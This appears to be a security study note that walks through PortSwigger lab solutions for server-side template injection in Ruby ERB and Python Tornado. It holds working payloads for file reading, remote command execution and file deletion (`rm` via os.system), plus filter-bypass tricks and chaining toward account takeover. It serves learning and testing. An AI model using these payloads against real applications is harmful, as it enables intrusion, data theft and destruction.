# SSTI — Basic expression injection (ERB, code context)

Two basic patterns: (1) user input directly rendered as ERB template — `<%= expr %>` evaluates; (2) user input sets a template variable name that's used in a template expression — injecting Tornado `{{` syntax breaks out of the variable context and executes arbitrary code.

## Quick reference
```ruby
# ERB (Ruby) — arithmetic confirms SSTI
GET /?message=<%= 7*7 %>  →  49 in response

# ERB — file read
GET /?message=<%= File.read('/home/carlos/secret') %>

# ERB — RCE
GET /?message=<%= `id` %>

# Tornado (Python) — code context break-out
# Template: Hello {{username}} where username = user-controlled variable NAME
# Inject: }}{{7*7 (closes the variable reference, opens new expression)
# Actual payload for RCE:
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

## Root cause
- **ERB:** user input passed directly to `ERB.new(user_input).result` — the input IS the template.
- **Code context:** user input selects a variable name used in a template expression like `Hello {{blog-post-author-display}}`. Injecting `}}...{{` breaks out of the variable and injects new template syntax.

## Find it
**ERB:** any parameter that gets reflected in an error message — try `<%= 7*7 %>` URL-encoded.

**Code context:** find a preference setting that changes display format (full name vs nickname) — the setting value is likely used as a variable name inside a template. Submit `{{7*7}}` as the value → if next page shows 49, SSTI.

## Technique
**ERB (Lab 1):**
1. Product page with `?message=` param shows "out of stock" message.
2. Try `?message=<%= 7*7 %>` — response shows 49. SSTI confirmed in ERB.
3. Exploit: `?message=<%= File.read('/home/carlos/secret') %>`.
4. URL-encode and send.

**Code context/Tornado (Lab 2):**
1. POST `/my-account/change-blog-post-author-display` sets `blog-post-author-display` param.
2. Try setting param to `}}{{7*7}}` → view blog post → 49 in author name → SSTI.
3. Identify engine: Tornado (Python) from `{%` syntax.
4. Final payload: `blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}`

## Payload arsenal
```
# ERB
<%= 7*7 %>
<%= File.read('/home/carlos/secret') %>
<%= `cat /home/carlos/secret` %>

# Code context (Tornado/Jinja2 break-out)
}}{{7*7
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

## Labs

### Basic server-side template injection [Practitioner]
`?message=` param reflected via ERB. `<%= 7*7 %>` → 49 confirms. `<%= File.read('/home/carlos/secret') %>` → file contents. Key insight: user input IS the template; `<%= %>` evaluates Ruby expressions.

### Basic server-side template injection (code context) [Practitioner]
Blog author display name controlled by POST param. Inject `}}{{7*7}}` → 49 in author field → SSTI in Tornado. Break out with `user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}`. Key insight: user input used AS a variable name inside a template expression — injecting `}}` breaks out.

## Bypasses
| Block | Bypass |
|---|---|
| Filtered `{{ }}` | engine alt syntax (`${ }`, `<%= %>`, `#{ }`, `*{ }`); concatenation |
| Blocked keywords (`os`,`system`) | attribute traversal (`''.__class__.__mro__`), `request`/`self` objects, hex/unicode |
| Sandboxed engine | reflection chain (`getClass().getProtectionDomain()...`) → see [Sandbox-escape-and-advanced](../Sandbox-escape-and-advanced/) |

## Chaining
- SSTI → **RCE** → file read / OS command → internal/cloud ([OS-command-injection](../../OS-command-injection/), [objectives: RCE](../../references/objectives-attack-trees.md)).
- Django SSTI → `{{settings.SECRET_KEY}}` → forge signed cookies → **ATO** ([Authentication](../../Authentication/)).

## Real-world notes
- ERB is extremely common in Ruby/Rails apps — any reflected message param is suspect.
- Code context SSTI (variable name injection) is less obvious but very common in notification/email templates.

## References
- https://portswigger.net/web-security/server-side-template-injection
